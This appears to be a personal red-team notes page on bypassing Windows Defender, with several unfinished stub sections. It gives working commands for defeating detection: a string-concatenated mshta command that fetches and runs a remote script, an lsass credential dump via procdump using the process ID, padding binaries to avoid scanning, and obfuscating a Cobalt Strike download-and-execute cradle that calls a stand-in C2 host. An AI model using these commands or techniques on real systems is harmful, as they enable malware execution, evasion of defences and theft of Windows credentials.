---
title: "Bypassing AV"
date: 2020-07-16T13:41:37+02:00
draft: false
---
asdas

#### Bypassing Defender (Work Out)
reference: https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/

#### Finding AMSI triggers ToDo
Using the 

#### Bypassing generic Defender detection using string concat.
In a lot of cases potentially malicious commands will be blocked by defender. Say we execute the following command, which downloads a JavaScript file which will execute using Microsoft HTA and spawn a calculator.

```
$ mshta.exe vbscript:Close(Execute("GetObject(""script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js"")"))
```
This will get flagged my defender immediately and execution will be prevented. However, using string concatination we can very easily obfuscate commands. The following command does not get flagged by Defender:
```
mshta.exe vbscript:Close(Execute("GetO"+"bject"+"(""script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js"")"))
```
***

#### lsass dumping under Windows Defender
When using procdump to dump lsass the dump is removed as soon as it touches disk by Windows Defender. My supplying the PID instead of the process name this can be bypassed. Get the PID via:
```
 tasklist /fi "imagename eq lsass.exe"
```
Then dump using the PID:
```
procdump -accepteula -ma <PID> lsass.dmp
```
***


#### Unhook API calls ToDo

#### Add data to the binary
Adding random or "known good" data to the beginning or end of a binary can serve two causes. One; some antimalware software has a limit on size of the files they can inspect (for performance reasons). Adding lots of exra data might exempt you from analysis.
Two; Adding data from software or files that is known to be good can help increas the "goodness"-score when statically analysing the file.

#### Obfuscating PowerShell using Invoke-Obfuscation ToDo
Invoke-Obfuscation is a framework to obfuscate PowerShell. The examples below show how to encode a PowerShell webdelivery scriptblock generated by Cobalt Strike using the 'TOKEN' obfuscation method.

```
$ Import-Module ./Invoke-Obfuscation.psd1
$ Invoke-Obfuscation
$ set SCRIPTBLOCK IEX (New-Object Net.Webclient).downloadstring('http://cobaltstrike.c2/evil.ps1')
$ TOKEN
$ ALL
$ 1
```
***


#### Using syscals ToDo
